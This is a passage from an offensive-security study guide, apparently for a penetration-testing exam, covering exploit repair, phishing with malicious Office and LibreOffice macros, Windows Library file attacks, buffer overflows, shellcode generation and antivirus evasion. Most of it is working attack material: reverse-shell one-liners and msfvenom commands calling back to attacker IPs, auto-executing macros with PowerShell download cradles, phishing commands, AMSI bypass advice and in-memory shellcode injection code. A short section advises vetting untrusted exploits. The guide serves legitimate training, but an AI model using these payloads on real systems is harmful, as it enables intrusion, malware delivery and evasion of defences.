Offset / buffer length The padding (e.g. "A" * 780) must place your bytes exactly over the return address. If you change the payload length, re-check the offset so EIP is still overwritten precisely.
Return address (JMP ESP) Don't trust the hard-coded address — find a JMP ESP in a non-ASLR module of the target version yourself. Remember little-endian: 0x10090c83 → "\x83\x0c\x09\x10".
Shellcode / payload Replace the author's shellcode (which calls back to their IP) with your own. Reverse-engineer custom payloads before trusting them.
Bad characters Bytes the target app mishandles must be excluded from the payload, or the shellcode breaks. \x00 (null/string terminator), \x0a (LF), \x0d (CR) are the usual suspects. 
# Regenerate shellcode for the exploit, excluding bad characters
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 \
  EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

# 64-bit one-liner reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
# Cross-compile a C exploit to a Windows PE on Kali (mingw-w64)
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
# If the linker errors with "undefined reference" to winsock calls, link ws2_32:
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
  • The return address in C exploits is often a byte array, e.g. unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83 — patch this to a valid JMP ESP for your target build.
  • Python 2 PoCs are everywhere on Exploit-DB; convert with 2to3 exploit.py -w when only Python 3 is available (watch out for print, str vs bytes, and struct.pack issues).
  • The exam no longer requires writing a buffer overflow from zero — but you are expected to fix offsets, return addresses, bad chars, and shellcode in a supplied exploit. See 21.8 Cross Compiling for Windows for more compilation notes.

4.11.2 Fixing Web Exploits

Web exploits rarely involve hex-encoded shellcode, so fixing them is about making the script's assumptions match the live target. Walk through the code top-to-bottom and ask: what is hard-coded that differs in my scenario?

Variable to check Typical fix
base_url / target IP & protocol Point it at your target and match http vs https and the correct port (e.g. https://<target>:443).
Credentials Update username / password variables with creds you recovered during enumeration.
CSRF token / separator params Anti-CSRF params (e.g. csrf_param) must match what the live app returns — print the server response and adjust the variable (e.g. the exploit expects __c but the CMS returns _sk_).
Payload Confirm the embedded webshell/command payload (often <?php system($_GET['cmd']);?>) fits your goal; swap for a reverse shell if needed. 
# Common web-exploit payload and the variables you usually need to edit
import requests, base64
base_url = "https://192.168.50.16:443"      # <-- match target IP / protocol / port
username = "admin"                            # <-- creds from enumeration
password = "password123"
payload  = "<?php system($_GET['cmd']);?>"   # <-- the webshell that gets uploaded
# After the exploit uploads the shell, validate it and pass commands
curl https://192.168.50.16/uploads/shell.php?cmd=id --insecure

5. Client-Side Attacks

Techniques that target end-user applications — Office macros, Windows Library files, and email delivery — to gain initial access by executing payloads on victim machines.

Vehicle Trigger Primary Target Key Tool / Command Notes / OPSEC
Office VBA Macro (.docm / .xlsm) User opens document and clicks "Enable Content" Windows — Microsoft Office CreateObject("Wscript.Shell").Run Blocked from internet sources by MOTW (2022+); deliver inside ISO/ZIP/container to strip MOTW; AMSI inspects in-memory PS
Windows Library file (.Library-ms) User opens file → Explorer auto-mounts WebDAV share Windows — Explorer / file-sharing wsgidav on Kali + crafted XML Less suspicious extension than .docm; HTTP WebDAV logged by proxies; pair with LNK in the share root for full code execution
LNK Shortcut (.lnk) User double-clicks shortcut (often surfaced via Library file) Windows — Shell PowerShell target field: powershell.exe -c "IEX(...)" SmartScreen warns on downloaded LNKs; place on attacker-controlled WebDAV share to avoid MOTW on the shortcut itself
HTA (HTML Application) User opens .hta file — executed by mshta.exe, not a browser sandbox Windows — IE/Edge legacy, email attachment msfvenom -f hta-psh Runs with full user privileges outside browser sandbox; commonly flagged by modern Defender; useful as intermediate stage embedded in LibreOffice macro
LibreOffice Macro (.odt / .ods) User opens document and enables macros Linux and Windows — LibreOffice Shell("/bin/bash -c '...'") or Shell Str, 1 Not subject to MOTW changes; default security level is "Medium" (shows dialog); valuable Linux foothold vector where MS Office macros are irrelevant
Email delivery (SWAKS / sendemail) Victim receives and opens attachment from above vehicles Any OS — mail client swaks --attach ... --auth LOGIN Requires valid SMTP relay or credentials; SPF/DKIM failures expose spoofed senders; use look-alike domain or compromised internal account

5.1 Macros

Office VBA macros auto-execute on document open via AutoOpen / Document_Open and launch PowerShell payloads including Base64-encoded reverse shells; must use UTF-16LE encoding for -EncodedCommand.

' Auto-execute stub - fires on Document_Open or AutoOpen
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

' Launch PowerShell directly
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub

' Pass a full command as a string variable
Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "[Your PowerShell Command]"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub
# PowerShell download cradle - fetch and execute powercat reverse shell
IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powercat.ps1]');powercat -c [attacker-ip] -p [port] -e powershell

# Base64-encode the cradle command (run on attacker machine)
$text = "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text))
Write-Output $encoded
# Split the Base64 string into 50-char chunks for embedding in a macro
cmd_str = "[Your Base64 Encoded PowerShell Command]"
chunk_size = 50

for i in range(0, len(cmd_str), chunk_size):
    print(f'Str = Str + "{cmd_str[i:i+chunk_size]}"')
' Full macro using encoded command - paste chunk output from the Python script
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim encodedCmd As String

    encodedCmd = encodedCmd + "[Base64 Chunk 1]"
    encodedCmd = encodedCmd + "[Base64 Chunk 2]"
    encodedCmd = encodedCmd + "..."
    encodedCmd = encodedCmd + "[Base64 Chunk N]"

    CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " & encodedCmd
End Sub
Technique VBA / PowerShell element Purpose Exam / OPSEC note
Auto-execute entry points AutoOpen / Document_Open Fire macro immediately on document open without user interaction beyond enabling macros Define both to cover all open paths
Process spawn CreateObject("Wscript.Shell").Run Launch an arbitrary command outside the Office process tree Spawning powershell.exe directly from Word is a high-fidelity EDR alert; route through cmd.exe /c to add one layer
Download cradle IEX(New-Object System.Net.WebClient).DownloadString(...) Fetch and execute a remote PS1 script without writing to disk AMSI intercepts in-memory; consider an AMSI bypass or custom stager
Base64 encoding [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(...)) Obscure command from signature-based AV and fix quoting in VBA strings Must use UTF-16LE (Unicode) encoding; UTF-8 produces a different Base64 that -EncodedCommand will reject
Payload chunking (Python) 50-char Str = Str + "..." loop Work around VBA string literal length limit; also fragments payload for AV Chunk size of 50 is conservative; sizes up to ~200 are safe in most Office versions

5.2 Windows Library Files

Windows .Library-ms files point to attacker-controlled WebDAV shares; Explorer auto-mounts the share and renders the LNK shortcut, which executes a PowerShell download cradle when clicked.

# Start the WebDAV server on Kali - serves the payload directory anonymously
wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
<!-- .Library-ms file - points the Windows library to the attacker WebDAV share -->
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>[http://your-server]</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
# LNK shortcut target - cradle downloads and executes the payload when clicked
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
Attack step Component Attacker action Victim-side observable
1 — Hosting wsgidav WebDAV server wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /share/ No victim interaction yet
2 — Delivery .Library-ms file sent via email or USB Attach to phishing email via swaks --attach lib.Library-ms Victim sees email with an attachment that looks like a folder shortcut
3 — Mount Windows Explorer WebDAV auto-mount Monitor wsgidav log for GET request from victim IP Explorer opens Library view showing contents of attacker share
4 — Execution Malicious .lnk shortcut on the share Confirm shell callback on nc -lvnp [port] Victim double-clicks the shortcut; PowerShell spawns hidden, downloads and runs payload

5.3 Advanced Exploitation

Fragment known-malicious strings so static AV signatures no longer match; combine concatenation, cmd.exe indirection, and Base64 encoding — encoded commands alone do not bypass AMSI, prepend an AmsiScanBuffer patch in the same PS session. Test on antiscan.me (does not distribute samples) to avoid burning the payload.

' String concatenation to bypass signature detection - splits "powershell.exe"
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "powe" & "rshe" & "ll.exe"
    cmdStr = cmdStr & " -nop -w hidden -enc " & "[Base64 Encoded Command]"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub

' Launch via cmd.exe to avoid direct PowerShell reference
Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "cmd.exe /c ""powershell.exe -nop -w hidden -enc " & "[Base64 Encoded Command]" & """"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub
# Base64-encode with UTF-8 and run with policy bypass
$text = "[Your PowerShell Command]"
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
Write-Output $encoded

powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand [Your Base64 Encoded Command]
// Obfuscated JavaScript - builds and executes a WScript.Shell command at runtime
var cmd = "";
cmd += "var shell = new ActiveXObject('WScript.Shell');";
cmd += "shell.Run('cmd.exe /c powershell.exe -nop -w hidden -enc [Base64 Encoded Command]');";
eval(cmd);
# Mount WebDAV share as a network drive on Windows
net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
Evasion technique Defeats Implementation Does NOT defeat
String concatenation ("powe"&"rshe"&"ll") Static string signatures in VBA/script files Manually split known-bad tokens; or use the Python chunker Behaviour-based EDR watching process spawn lineage
cmd.exe /c indirection Parent-process heuristics (Office → PowerShell) cmdStr = "cmd.exe /c ""powershell.exe ..." in VBA Network-based detection of beaconing after execution
Base64 -EncodedCommand String signatures on raw PS command line [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(...)) AMSI in-memory inspection of decoded script
JavaScript eval obfuscation Static script scanners in browser / HTA context Build command string at runtime and pass to eval() Windows Script Host logging; modern SmartScreen
HTA (mshta.exe) as intermediary Direct Office → PowerShell process chains msfvenom -f hta-psh; macro calls mshta.exe evil.hta Defender's mshta.exe child-process rules (often blocked by ASR)
AMSI bypass (memory patch) AMSI in-memory script scanning Prepend bypass snippet to encoded PS command ETW-based logging; constrained language mode

5.4 Phishing

Deliver malicious attachments using SWAKS or sendemail from the command line, with optional SMTP authentication and social-engineering headers.

# Basic attachment email
sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header "Subject: [email-subject]" --suppress-data
# Authenticated email - use when SMTP server requires LOGIN credentials
sudo swaks -t [recipient@example.com] --from [sender@example.com] \
--attach config.Library-ms --server [SMTP_SERVER] --body body.txt \
--header "Subject: Problems" --suppress-data \
--auth LOGIN --auth-user [username] --auth-password [password]
# Social-engineering headers - marks email as highest priority
sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header "X-Priority: 1 (Highest)" --header "Importance: High" --suppress-data
# sendemail - simpler alternative
sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
-u '[subject]' -m '[message]' -a '[attachment]'
Feature Normal SWAKS SWAKS with Auth SWAKS Social Engineering sendemail
Authentication No Yes No No
Custom Headers Subject only Subject only Multiple (e.g., Priority, Importance) Subject only
SMTP Authentication No Yes No No
Social Engineering Usage No No Yes (with custom headers) No
Tool Complexity Moderate Moderate Moderate Simple
Scenario SMTP port Required SWAKS flags Success indicator
Open relay (no auth) 25 --server mx.target.com SMTP 250 OK after RCPT TO
Authenticated submission 587 --auth LOGIN --auth-user u --auth-password p --tls SMTP 235 Authentication successful
Implicit TLS (SMTPS) 465 --tlsn --auth LOGIN ... TLS handshake completes before SMTP banner
Internal relay (pentest lab) 25 or custom --server [internal-ip] --from internal@corp.local Email arrives in victim inbox; WebDAV or listener callback

5.5 Exploiting LibreOffice Macros for Payload Execution

LibreOffice Basic macros execute system commands via Shell() on both Linux and Windows; not subject to MOTW macro-blocking — assign to the Open Document event (Tools → Customize → Events) for auto-execution.

5.5.1 Linux Targets

Generate a Linux payload, embed a download-and-execute macro in a .odt document, then deliver via email and catch the shell with Netcat.

msfvenom -p linux/x64/shell_reverse_tcp LHOST=[your_ip] LPORT=4444 -f elf  -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[your_ip] LPORT=4444 -f bash -o payload.sh
msfvenom -p python/meterpreter/reverse_tcp LHOST=[your_ip] LPORT=4444 -f raw  -o payload.py
# Bash reverse shell (no msfvenom)
echo 'bash -i >& /dev/tcp/[your_ip]/4444 0>&1' > shell.sh

# Python reverse shell (no msfvenom)
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("[your_ip]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > shell.py

# Perl reverse shell (no msfvenom)
echo 'use Socket;$i="[your_ip]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' > shell.pl
python3 -m http.server 80
nc -lvnp 4444
' LibreOffice Basic macro - ALT+F11 to open editor
' Create under My Macros > Standard > Module1; save as update.odt
Sub RunShell
    Shell("/bin/bash -c 'wget http://[your_ip]/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh'")
End Sub
swaks --to [target@example.com] --from [sender@example.com] \
--server [smtp.example.com]:587 --auth LOGIN \
--auth-user [sender@example.com] --auth-password '[password]' \
--attach update.odt --header "Subject: Important Update" \
--body body.txt
Payload format msfvenom -f flag Requires on target When to use
ELF binary elf Execute permission, x86_64 Linux Most reliable; self-contained, no interpreter dependency
Bash script bash (or plain echo) /bin/bash Lightweight; easily inspected; good for simple reverse shell
Python script raw (python payload) python3 or python Fallback when bash TCP redirection is firewalled; cross-platform
Perl script manual (echo to file) perl Older systems; Perl still present on many legacy Linux installs
Meterpreter (ELF staged) elf with meterpreter/reverse_tcp Network access back to MSF listener Post-exploitation features needed (file upload, pivot, screenshot)

5.5.2 Windows Targets

Generate a Windows payload with msfvenom, chunk the Base64 string into a LibreOffice Calc macro, and deliver the .ods file via email.

msfvenom -p windows/shell_reverse_tcp LHOST=[attacker-ip] LPORT=[port] -f hta-psh -o evil.hta
msfvenom -p windows/shell_reverse_tcp LHOST=[attacker-ip] LPORT=[port] -f exe    -o evil.exe
msfvenom -p windows/shell_reverse_tcp LHOST=[attacker-ip] LPORT=[port] -f vbs    -o evil.vbs
msfvenom -p windows/shell_reverse_tcp LHOST=[attacker-ip] LPORT=[port] -f ps1    -o script.ps1
msfvenom -p windows/shell_reverse_tcp LHOST=[attacker-ip] LPORT=[port] -f dll    -o payload.dll
# Open evil.hta, copy the Base64 payload string, paste below
# Splits into 50-char chunks for embedding in the LibreOffice macro
s = "<PASTE_PAYLOAD_HERE>"
n = 50

for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')
REM LibreOffice Calc macro - save as exploit.ods
REM Replace <INSERT_YOUR_PAYLOAD_CHUNKS> with the Python script output

Sub Exploit
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e "
    Str = Str + "<INSERT_YOUR_PAYLOAD_CHUNKS>"

    Shell Str, 1
End Sub
nc -lvnp [port]
swaks --to [target@example.com] --from [sender@example.com] \
--server [smtp.example.com]:587 --auth LOGIN \
--auth-user [sender@example.com] --auth-password '[password]' \
--attach evil.hta --header "Subject: Important Document" \
--body body.txt
msfvenom format -f flag Executed by Embed in macro via AV exposure
HTA-PSH hta-psh mshta.exe Extract Base64 block → chunk with Python → paste into Str Moderate; Defender rules on mshta.exe child process
PowerShell script ps1 powershell.exe -File Embed script content directly as chunked string; write to disk and execute High without AMSI bypass; AMSI scans .ps1 content
VBScript vbs wscript.exe or cscript.exe Write .vbs to %TEMP% via macro and execute with wscript.exe path Moderate; older technique, well-detected by modern AV
EXE exe Direct execution Download cradle in macro (WebClient) → write to %TEMP% → execute High; standalone EXE heavily scrutinised by Defender and email gateways
DLL dll rundll32.exe payload.dll,EntryPoint Download via cradle → call Shell "rundll32.exe ..." Lower than EXE for gateway scanners; EDR watches rundll32 closely

6. Exploit Development

The exam rewards the person who can fix a broken PoC, not the person who can write one from scratch. The vast majority of exam exploits are either Metasploit modules or public PoCs from ExploitDB/GitHub that need one or two adjustments before they fire on the lab target. The workflow is always: find the candidate, read it, sandbox it, adjust it, fire it — in that order.

6.1 Finding Public Exploits

You almost always pivot from a version string captured during enumeration (nmap -sV, banner grab, CMS fingerprint, default page). Match the version exactly: vsftpd 2.3.4 ≠ vsftpd 2.3.5; Apache 2.4.49 has CVE-2021-41773, 2.4.50 doesn’t (initially), 2.4.51 doesn’t at all.

# searchsploit — local ExploitDB mirror (refresh it once on exam day)
searchsploit -u                              # update offline DB
searchsploit "vsftpd 2.3"                    # title search
searchsploit -t apache 2.4.49                # title-only
searchsploit --exclude="dos|webapps/php"     # filter out noise
searchsploit -m 49757                        # mirror PoC to current dir
searchsploit -p 49757                        # show path + open in $EDITOR

# Nmap+searchsploit combined (parses CPE strings)
nmap -sV --script vulners 10.10.10.5

# GitHub is the other primary source — public PoCs live there
# Search via gh CLI or the web with refined queries:
gh search repos "CVE-2021-41773" --language=python
# or web: "CVE-XXXX-XXXX" site:github.com
# Always read commits / issues / forks — the working PoC is often in a fork

# Trustworthy curated catalogs
# - https://github.com/nomi-sec/PoC-in-GitHub
# - https://github.com/trickest/cve
# - https://nvd.nist.gov  (verify CPE + affected version ranges)

When you find a match, check whether Metasploit already has it: msfconsole -q -x "search cve:2021-41773; exit". On exam day you may use one auto-exploit / Meterpreter / post module against one in-scope machine — pick wisely. Manual MSF auxiliary modules (scanners, checkers) don’t count.

6.2 Trusting (or Distrusting) Untrusted PoCs

Random GitHub PoCs are a credible threat to your jumpbox. Always read the source before running. Look for: a base64 blob that gets execd, a curl | sh from a domain you don’t recognize, a giant hex shellcode that doesn’t match a msfvenom generated one, encoded URLs, or weird helper imports. If the exploit is in a binary you can’t read, run it from a disposable VM — not your exam Kali.

# Quick triage on a PoC file
file exploit.py                              # is it really Python?
head -50 exploit.py                          # read it
strings exploit.bin | less                   # binary blob? look for embedded URLs
grep -E "exec|eval|base64|urllib|requests|socket|subprocess" exploit.py

# Catch outbound calls during PoC execution (Kali side)
sudo tcpdump -i tun0 -nn -w poc.pcap 'not port 22'

# Compare suspicious shellcode bytes against msfvenom output
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tap0 LPORT=4444 -f raw -o /tmp/sc.bin
xxd /tmp/sc.bin | head
xxd suspicious_shellcode.bin | head
diff <(xxd /tmp/sc.bin) <(xxd suspicious_shellcode.bin) | head

Red flags in PoC code that mean “do not run, or read very carefully”: requests.post("http://<random-domain>", data=...), os.system(base64.b64decode(...)), large hex blobs labelled shellcode with no comment showing what they do, prompts asking for your sudo password, or anything that downloads a second-stage from a URL.

6.3 Fixing a Broken PoC

The five things that break PoCs in practice, in roughly the order you hit them:

SymptomRoot causeFix
SyntaxError: Missing parentheses in call to 'print'Python 2 PoC running on Python 32to3 -w exploit.py or just run with python2 exploit.py
ModuleNotFoundError: No module named 'requests'Missing pip modulepip install requests (or use pipx / a venv)
UnicodeDecodeError / bytes vs strPy3 byte/string mismatchWrap strings as b".." or call .encode() / .decode()
Compile fails with fatal error: unistd.h: No such fileCompiling Linux PoC on Kali for Windows targetUse x86_64-w64-mingw32-gcc (or 32-bit i686-w64-mingw32-gcc)
Exploit runs but service doesn’t crash / shell doesn’t come backWrong target version, wrong offset, badchars in shellcode, payload too bigRe-verify version. Recompute offset (pattern_create/pattern_offset). Regenerate shellcode with -b. Check buffer size.
 
# Fix Python 2 PoC for Python 3 in seconds
2to3 -w exploit.py                           # rewrites in place
# Manually:  print x  →  print(x)
#            xrange   →  range
#            "..."    →  b"..." for socket sends

# Cross-compile a Linux C PoC to a Windows EXE
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
# 64-bit:
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32

# Compile a Windows kernel/local PoC (use Visual Studio on a dev VM for SYSTEM ones)
# On Kali, for simple usermode PoCs:
i686-w64-mingw32-gcc -m32 -o ms11-046.exe ms11-046.c

# Compile a 32-bit Linux ELF on 64-bit Kali
gcc -m32 cve.c -o cve         # apt install gcc-multilib if missing

6.4 Stack Buffer Overflow Walkthrough

The exam doesn’t require you to write a buffer overflow from zero, but you should be able to take a PoC that crashes a service, identify EIP, regenerate shellcode, and fire it. The pattern below is the classical vulnserver-style flow that every stack-overflow BOF follows.

# 1. Fuzz / confirm the crash
python3 -c 'import socket;s=socket.socket();s.connect(("10.10.10.5",9999));s.send(b"TRUN /.:/" + b"A"*5000); s.close()'

# 2. Generate a unique pattern, find EIP offset
msf-pattern_create -l 5000 > pat.txt           # paste into exploit
# crash again — read EIP value from debugger (e.g. 39654138)
msf-pattern_offset -l 5000 -q 39654138
#   [*] Exact match at offset 2003

# 3. Verify the offset
# Payload = b"A"*2003 + b"BBBB" + b"C"*(5000-2003-4)
# Debugger should show EIP = 42424242 ("BBBB")

# 4. Find bad characters — send 0x01..0xff, identify which bytes get mangled
badchars = bytes(range(1, 256))   # often 0x00, 0x0a, 0x0d are bad; protocol-specific others
# Send: b"A"*2003 + b"BBBB" + badchars + padding
# Inspect memory at the buffer — note any missing/altered bytes — those are badchars

# 5. Find a "JMP ESP" gadget in a non-ASLR module (mona.py inside Immunity Debugger)
# !mona modules                                    # list loaded modules + protections
# !mona find -s "\xff\xe4" -m essfunc.dll          # FF E4 = JMP ESP

# 6. Generate shellcode with the bad chars excluded
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b "\x00\x0a\x0d" -f c -v shellcode --smallest

# 7. Final exploit skeleton
python3 -c '
import socket
ip,port = "10.10.10.5", 9999
offset = 2003
ret    = b"\xaf\x11\x50\x62"          # JMP ESP from mona, little-endian
nops   = b"\x90" * 16                  # NOP sled
shell  = b"\xfc\xe8\x82..."            # msfvenom shellcode
buf    = b"A"*offset + ret + nops + shell
s = socket.socket(); s.connect((ip,port))
s.send(b"TRUN /.:/" + buf); s.close()
'

If EIP isn’t reachable but you crash inside SEH, you’re in SEH-overwrite territory: overwrite nSEH with a short jump and SEH with a POP POP RET gadget. Find one with !mona seh. Use msf-pattern_* the same way, just measure to nSEH/SEH instead of EIP.

6.5 Shellcode Generation & Encoding

# Reverse TCP — most common shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b "\x00\x0a\x0d" -f c

# x64 variant
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b "\x00" -f c

# Linux x86 reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b "\x00" -f c

# Encoded payload (NOT actually for AV evasion — encoders only help with bad chars)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b "\x00\x0a\x0d" -f exe -o rev.exe

# Output formats you'll actually use:
# -f c        — byte array for C exploits
# -f python   — bytes literal for Python exploits
# -f raw      — raw bytes for piping
# -f exe / elf / asp / war / vba / hta / psh   — runnable artifacts

# Inspect / disassemble shellcode
msf-nasm_shell        # interactive: prompt > "jmp esp" returns FFE4
ndisasm -b 32 shellcode.bin
ndisasm -b 64 shellcode.bin

6.6 Modern Mitigations You’ll Run Into

Exam targets are deliberately mitigation-light, but you’ll still encounter these in the lab. Knowing the name + the workaround is enough — the exam doesn’t expect you to defeat full ASLR+DEP+CFG from scratch.

MitigationWhat it doesPractical workaround on exam-tier targets
DEP / NXMarks the stack non-executable — shellcode on the stack won’t runUse a ROP chain that calls VirtualProtect / VirtualAlloc to mark the buffer executable. !mona rop generates one for you.
ASLRRandomizes module base addresses — hardcoded RET addresses breakFind a non-ASLR module (!mona modules shows ASLR=False). On 32-bit Windows there’s almost always one DLL opted out.
Stack canary (/GS)Adds a cookie before the return address; mismatch crashes the processEither overwrite SEH instead, leak the cookie via a separate primitive, or target a binary compiled without /GS.
SafeSEH / SEHOPValidates SEH chain integrityUse a non-SafeSEH module’s POP POP RET. SEHOP usually needs a separate info-leak.
CFG / ACGRestricts indirect calls and dynamic code generationOut of scope — just be aware so you don’t waste time on Win11/2022 lab boxes that have them on.
 
# Quick check: which mitigations are enabled on a Windows binary?
# (run on a Windows dev VM)
# PowerShell:
Get-ProcessMitigation -Name notepad.exe

# Linux:  checksec from pwntools / package
checksec --file=/usr/bin/passwd
checksec --proc=<pid>
#   RELRO  STACK-CANARY  NX  PIE  RPATH  RUNPATH  Symbols  FORTIFY

Two lab patterns to recognize: (1) a 32-bit Windows service compiled without ASLR+DEP — classic JMP ESP + stack shellcode works; (2) a 64-bit Linux SUID with NX but no PIE — ret2libc or ret2plt to system("/bin/sh"). Both are PoC-modify jobs, not write-from-scratch.

7. Antivirus Evasion & Metasploit

Bypass AV using in-memory injection, PE injection (Shellter), encoding, and staged/stageless payload generation.

Evasion Technique What it Defeats Notes
In-memory injection (PowerShell) Signature scanning (on-disk); static PE analysis No file written to disk; AMSI still inspects script content before execution — patch or bypass AMSI first
Shellter PE injection Signature scanning; static PE heuristics Host PE structure matches known-good binary; code is grafted inside legitimate sections; does not defeat runtime behavioural monitoring
Msfvenom encoding (shikata_ga_nai) Simple byte-pattern signature matching Polymorphic XOR encoder; well-known to modern AV; multiple iterations (-i) help marginally but increase file size and heuristic score
Staged payload delivery Signature scanning (initial dropper is minimal) Tiny first-stage stager downloads the full payload at runtime; the second stage may still be detected in memory; typically restricted in exam contexts
Base64 / -EncodedCommand Command-line argument string matching Does not defeat PowerShell 5+ script-block logging, which decodes and logs plaintext before execution; combine with AMSI bypass for real protection
AMSI patching (memory) AMSI interception of script content Overwrites AmsiScanBuffer return value in amsi.dll in the current process; must be run before any suspicious script content is loaded; detected by some EDRs via memory integrity scanning
Process hollowing / RunPE Signature scanning; static analysis Creates a legitimate process in suspended state, replaces its memory with malicious code, then resumes; detected by behavioural EDRs monitoring NtWriteVirtualMemory / NtResumeThread call sequences
DLL side-loading Signature scanning; application whitelisting A signed, trusted application loads a malicious DLL placed in its search path; the parent process is trusted so AV may not inspect its loaded modules as aggressively
Living-off-the-land (LOLBAS) Signature scanning; application whitelisting Use built-in Windows binaries (mshta.exe, regsvr32.exe, certutil.exe) to download/execute payloads; typically whitelisted but heavily monitored by mature EDRs
Payload obfuscation (custom packer/crypter) Signature scanning; heuristic analysis A custom stub decrypts/decompresses the real payload at runtime; more effective than standard encoders because the decryption routine is unique; stub itself can be flagged if poorly written

7.1 In-Memory Injection with PowerShell Script

Inject shellcode directly into memory using PowerShell and Windows API calls to avoid writing payloads to disk.

  • VirtualAlloc reserves executable memory, memset writes shellcode bytes into it, and CreateThread starts execution from the shellcode's entry point.
  • AMSI inspects PowerShell script content before execution; bypass AMSI first or the script will be blocked at the script-block level even though no file is written.
  • Allocating memory with PAGE_EXECUTE_READWRITE (0x40) is a high-confidence EDR signal; splitting alloc/write/protect phases reduces this noise.
  • If PowerShell is running under Constrained Language Mode (CLM), Add-Type is blocked; use [System.Reflection.Assembly]::Load() or powershell -version 2 if .NET 2.0 is present.
# Generate shellcode for PowerShell in-memory injection
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v sc
# Import VirtualAlloc, CreateThread, memset from kernel32/msvcrt
$importCode = '
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll", SetLastError=false)]
public static extern IntPtr memset(IntPtr dest, int c, UInt32 count);
';

$win32Functions = Add-Type -MemberDefinition $importCode -Name "Win32API" -Namespace "Win32" -PassThru;
# Define shellcode (replace with msfvenom output)
[Byte[]] $shellcode = [PLACE YOUR SHELLCODE HERE];

# Allocate RWX memory and copy shellcode in
$memSize = 0x1000;
if ($shellcode.Length -gt $memSize) { $memSize = $shellcode.Length };
$allocatedMemory = $win32Functions::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40);

for ($i = 0; $i -lt $shellcode.Length; $i++) {
    $win32Functions::memset($allocatedMemory + $i, $shellcode[$i], 1);
}

# Spawn execution thread; keep process alive
